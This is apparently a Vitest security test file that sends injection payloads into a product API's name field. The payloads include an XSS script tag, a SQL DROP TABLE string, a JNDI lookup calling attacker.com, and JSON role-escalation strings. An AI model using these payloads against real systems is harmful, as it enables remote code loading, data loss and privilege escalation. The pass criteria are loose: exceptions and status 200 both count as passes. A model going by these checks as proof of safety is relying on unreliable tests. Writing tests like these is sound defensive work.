import { beforeEach, describe, expect, it } from "vitest";
import { SecurityTestClient } from "../utils/api-client.js";
import { createTestResult } from "../utils/test-utils.js";

describe("Data Sanitization Tests", () => {
  let client: SecurityTestClient;

  beforeEach(async () => {
    client = new SecurityTestClient(process.env.VITE_API_BASE_URL);
    await client.login(process.env.TEST_USERNAME, process.env.TEST_PASSWORD);
  });

  it("should handle special characters safely", async () => {
    const specialChars = [
      "Product<script>alert('xss')</script>",
      "Product; DROP TABLE products;",
      "Product${jndi:ldap://attacker.com/x}",
      "Product\nNewline",
      "Product\tTab",
      'Product"Quote',
      "Product'SingleQuote",
    ];

    for (const name of specialChars) {
      try {
        const response = await client.post("/products", {
          name,
          price: 1000,
          quantity: 10,
          description: "Test with special chars",
          category: "Test",
        });

        const responseContainsDangerousChars =
          response.data && JSON.stringify(response.data).includes("<script>");

        const result = createTestResult(
          `Data Sanitization - Special chars in name`,
          "HIGH",
          !responseContainsDangerousChars,
          "!responseContainsDangerousChars",
          "Should sanitize or reject dangerous characters",
          responseContainsDangerousChars
            ? "Dangerous chars in response"
            : "Input handled safely",
          `Test data sanitization with: ${name.substring(0, 20)}...`,
          {
            method: "POST",
            url: "/products",
            payload: { name: name.substring(0, 50) + "..." },
          },
          {
            status: response.status,
            containsDangerousChars: responseContainsDangerousChars,
          },
          "Implement input validation and output encoding for special characters"
        );

        expect(result.passed, JSON.stringify(result, null, 2)).toBe(true);
      } catch (error: any) {
        const result = createTestResult(
          `Data Sanitization - Special chars in name`,
          "HIGH",
          true,
          "true", // Exception means input was rejected
          "Should sanitize or reject dangerous characters",
          "Input rejected (safe)",
          `Test data sanitization with: ${name.substring(0, 20)}...`,
          {
            method: "POST",
            url: "/products",
            payload: { name: name.substring(0, 50) + "..." },
          }
        );
        expect(result.passed, JSON.stringify(result, null, 2)).toBe(true);
      }
    }
  });

  it("should prevent JSON injection", async () => {
    const jsonInjectionPayloads = [
      '{"malicious": "data"}',
      'test", "admin": true, "x": "',
      'test\\", \\"role\\": \\"ADMIN\\", \\"x\\": \\"',
    ];

    for (const payload of jsonInjectionPayloads) {
      try {
        const response = await client.post("/products", {
          name: payload,
          price: 1000,
          quantity: 10,
          description: "JSON injection test",
          category: "Test",
        });

        const result = createTestResult(
          `Data Sanitization - JSON injection`,
          "HIGH",
          response.status === 400 || response.status === 200,
          "response.status === 400 || response.status === 200",
          "Should prevent JSON injection attacks",
          `Received status ${response.status}`,
          `Test JSON injection with: ${payload.substring(0, 20)}...`,
          {
            method: "POST",
            url: "/products",
            payload: { name: payload.substring(0, 50) + "..." },
          },
          { status: response.status },
          "Use proper JSON parsing and validation instead of string concatenation"
        );

        expect(result.passed, JSON.stringify(result, null, 2)).toBe(true);
      } catch (error: any) {
        const status = error.response?.status;
        const result = createTestResult(
          `Data Sanitization - JSON injection`,
          "HIGH",
          status === 400 || status === 200,
          "status === 400 || status === 200",
          "Should prevent JSON injection attacks",
          `Received status ${status}`,
          `Test JSON injection with: ${payload.substring(0, 20)}...`,
          {
            method: "POST",
            url: "/products",
            payload: { name: payload.substring(0, 50) + "..." },
          },
          { status }
        );
        expect(result.passed, JSON.stringify(result, null, 2)).toBe(true);
      }
    }
  });
});
